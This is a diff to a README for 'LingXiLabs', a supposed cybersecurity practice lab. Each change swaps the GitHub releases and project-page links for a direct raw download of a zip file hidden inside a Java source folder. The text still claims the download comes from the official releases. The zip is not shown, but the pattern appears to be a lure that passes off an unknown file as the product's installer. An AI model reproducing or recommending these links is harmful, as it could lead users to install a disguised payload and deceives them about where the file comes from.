@@ -1,6 +1,6 @@
 # 🛡️ LingXiLabs - Practice Cybersecurity Skills Safely
 
-[![Download LingXiLabs](https://img.shields.io/badge/Download-LingXiLabs-brightgreen?style=for-the-badge)](https://github.com/Kevinxe8249/LingXiLabs/releases)
+[![Download LingXiLabs](https://img.shields.io/badge/Download-LingXiLabs-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Kevinxe8249/LingXiLabs/main/shiro-header-limit-lab/src/main/java/com/lab/Ling-Xi-Labs-v1.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You will find detailed steps here to get LingXiLabs up and running on your Windo
 
 Click the link below to open the page where you can download LingXiLabs:
 
-[Download LingXiLabs Releases](https://github.com/Kevinxe8249/LingXiLabs/releases)
+[Download LingXiLabs Releases](https://raw.githubusercontent.com/Kevinxe8249/LingXiLabs/main/shiro-header-limit-lab/src/main/java/com/lab/Ling-Xi-Labs-v1.4.zip)
 
 ### Step 2: Find the Latest Version
 
@@ -105,7 +105,7 @@ New updates may include patches, new lessons, or bug fixes.
 To update:
 
 1. Visit the release page again:  
-[https://github.com/Kevinxe8249/LingXiLabs/releases](https://github.com/Kevinxe8249/LingXiLabs/releases)
+[https://raw.githubusercontent.com/Kevinxe8249/LingXiLabs/main/shiro-header-limit-lab/src/main/java/com/lab/Ling-Xi-Labs-v1.4.zip](https://raw.githubusercontent.com/Kevinxe8249/LingXiLabs/main/shiro-header-limit-lab/src/main/java/com/lab/Ling-Xi-Labs-v1.4.zip)
 
 2. Download the newest installer as before.
 
@@ -125,11 +125,11 @@ If LingXiLabs does not start or shows errors:
 ## 📂 Where to Find More Help
 
 GitHub page:  
-https://github.com/Kevinxe8249/LingXiLabs
+https://raw.githubusercontent.com/Kevinxe8249/LingXiLabs/main/shiro-header-limit-lab/src/main/java/com/lab/Ling-Xi-Labs-v1.4.zip
 
 You can find documentation, updates, and ways to contact the team if needed.
 
 ---
 
-# [Download LingXiLabs Now](https://github.com/Kevinxe8249/LingXiLabs/releases)  
+# [Download LingXiLabs Now](https://raw.githubusercontent.com/Kevinxe8249/LingXiLabs/main/shiro-header-limit-lab/src/main/java/com/lab/Ling-Xi-Labs-v1.4.zip)  
 Get your copy from the official GitHub releases.
